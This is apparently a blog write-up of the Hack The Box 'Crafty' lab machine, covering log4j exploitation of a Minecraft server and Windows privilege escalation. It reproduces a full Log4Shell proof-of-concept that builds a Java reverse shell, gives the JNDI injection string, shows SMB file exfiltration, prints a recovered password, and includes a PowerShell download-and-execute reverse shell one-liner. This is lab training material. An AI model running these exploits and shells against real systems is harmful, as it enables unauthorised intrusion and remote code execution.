---
title:  "HTB Crafty Writeup"
date:   2024-06-15 00:30:00 
categories: HTB Machine
tags: Minecraft log4j sourcecode_analysis
---

![Crafty](/assets/img/Crafty/GF1N_1zWkAAfibQ.png)

## Introduction

Personally i found the initial access of the machine very interesting the name and the webpage gave away what it was instantly because the log4j exploit was very popular in the media a bit ago. Never the less this was the first time i exploited it and it was a very fun experience. The privesc was pretty trivial source code analyis. overall i would recommend doing this box because of the initial access.

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A  -p-  -o nmap  10.129.203.233
```
**Nmap**
```
# Nmap 7.94 scan initiated Mon Feb 12 12:49:51 2024 as: nmap -sS -A -p- -o nmap 10.129.203.233
Nmap scan report for 10.129.203.233
Host is up (0.059s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://crafty.htb
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   72.10 ms 10.10.16.1
2   72.57 ms 10.129.203.233

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 12 12:52:07 2024 -- 1 IP address (1 host up) scanned in 136.22 seconds
```

Looking at the nmap output we can see that the serer hosted both a web server and a minecraft server. When looking at the minecraft server version in nmap we could see it was **Minecraft 1.16.5**, This version is supposedly vulnerable to the log4j attack. when checking out the webpage we could see its just a static webpage promoting a minecraft server.

![Webserver](/assets/img/Crafty/Crafty_01.png)

To exploit the log4j vulnerability we can install the following proof of concept from [github](https://github.com/kozmer/log4j-shell-poc).

first download the repo with git.

```bash
https://github.com/kozmer/log4j-shell-poc
```

Next install all requirements with pip

```bash
pip install -r requirements.txt
```

Next modify the exploit code, on line 26 where its says **String cmd="/bin/sh";** change it to **String cmd="cmd.exe";**

```python
#!/usr/bin/env python3

import argparse
from colorama import Fore, init
import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

CUR_FOLDER = Path(__file__).parent.resolve()


def generate_payload(userip: str, lport: int) -> None:
    program = """
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

    public Exploit() throws Exception {
        String host="%s";
        int port=%d;
        String cmd="cmd.exe";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}
""" % (userip, lport)

    # writing the exploit to Exploit.java file

    p = Path("Exploit.java")

    try:
        p.write_text(program)
        subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
    except OSError as e:
        print(Fore.RED + f'[-] Something went wrong {e}')
        raise e
    else:
        print(Fore.GREEN + '[+] Exploit java class created success')


def payload(userip: str, webport: int, lport: int) -> None:
    generate_payload(userip, lport)

    print(Fore.GREEN + '[+] Setting up LDAP server\n')

    # create the LDAP server on new thread
    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
    t1.start()

    # start the web server
    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
    httpd.serve_forever()


def check_java() -> bool:
    exit_code = subprocess.call([
        os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
        '-version',
    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    return exit_code == 0


def ldap_server(userip: str, lport: int) -> None:
    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
    print(Fore.GREEN + f"[+] Send me: {sendme}\n")

    url = "http://{}:{}/#Exploit".format(userip, lport)
    subprocess.run([
        os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
        "-cp",
        os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])


def main() -> None:
    init(autoreset=True)
    print(Fore.BLUE + """
[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc
""")

    parser = argparse.ArgumentParser(description='log4shell PoC')
    parser.add_argument('--userip',
                        metavar='userip',
                        type=str,
                        default='localhost',
                        help='Enter IP for LDAPRefServer & Shell')
    parser.add_argument('--webport',
                        metavar='webport',
                        type=int,
                        default='8000',
                        help='listener port for HTTP port')
    parser.add_argument('--lport',
                        metavar='lport',
                        type=int,
                        default='9001',
                        help='Netcat Port')

    args = parser.parse_args()

    try:
        if not check_java():
            print(Fore.RED + '[-] Java is not installed inside the repository')
            raise SystemExit(1)
        payload(args.userip, args.webport, args.lport)
    except KeyboardInterrupt:
        print(Fore.RED + "user interrupted the program.")
        raise SystemExit(0)


if __name__ == "__main__":
    main()
```

Next download jdk 8 we can do this from the huaweicloud repo's 

```bash
wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
```

Next unpack the archiv. and then move the contents to the **jdk1.8.0_20** directory. We need to do this because the exploit looks explicitly for this directory.

```bash
tar -xvf jdk-8u181-linux-x64.tar.gz
mv jdk1.8.0_181 jdk1.8.0_20
```

Now run the exploit with the following parameters. The lport is the port we use for our netcat listener.

```bash
python3 poc.py --userip 10.10.16.61 --webport 8000 --lport 443
```

The exploit then shows us the exact command we need to type in the minecraft chat

```bash
${jndi:ldap://10.10.16.61:1389/a}
```

After we fill in this string in the chat we will get a connection on our exploit.


![exploit connect](/assets/img/Crafty/Crafty_02.png)

Then a few moments later we'll get a reverse shell connection

![Reverse shell as svc_minecraft](/assets/img/Crafty/Crafty_03.png)

## Privesc

So now that we have access to the machine i started doing some enumeration on the machine itself. After not finding anything interesting with winpeas i looked around for some custom binaries or services. Then in the found the **playercounter-1.0-SNAPSHOT.jar** file in the plugins directory of the server. So to exfiltrate this file to our machine i set up a smb share on our machine using impacket


```bash
impacket-smbserver exfil ./ -smb2support -username "calico" -password "calico"
```

Then on the target side we need to mount the share onto the machine with the net command. After doing this we can move this file over to our machine

```powershell
net use Z: \\10.10.16.61\exfil /user:calico calico
copy .\playercounter-1.0-SNAPSHOT.jar Z:\playercounter-1.0-SNAPSHOT.jar
```

Next up we need to analyze this jar file i used jd-gui for this.

```bash
jd-gui playercounter-1.0-SNAPSHOT.jar
```

When looking through the jar file i could see in the Playercounter.class what seemed like credentials

![Creds in jar file](/assets/img/Crafty/Crafty_04.png)

Credentials
```
s67u84zKq8IXw
```


So we found credentials for a new user which is great. But seeing we can't log in with these directly we'll need to run these using runas, one issue with this is that runas doesn't work unless its a fully interactive shell. The tool [RunasCS](https://github.com/antonioCoco/RunasCs) though can help us with this as it allows us to execute commands without needing to have a interactive shell.

So first of all we need setup our webserver.

```
python -m http.server 80
```

Download the binary with the following command.

```powershell
wget "http://10.10.16.61/RunasCs.exe" -outfile "RunasCs.exe"
```

Next up we can run a command as webservice using the following command. For the reverse shell hosted a copy of  **Invoke-PowerShellTcp.ps1** script of [nishang](https://github.com/samratashok/nishang) This github repo contains multiple powershell scripts including reverse shells and other post exploitation tools.

```powershell
.\RunasCs.exe Administrator s67u84zKq8IXw "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.61/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.61 -Port 444" 
```

![Shell as administrator](/assets/img/Crafty/Crafty_05.png)



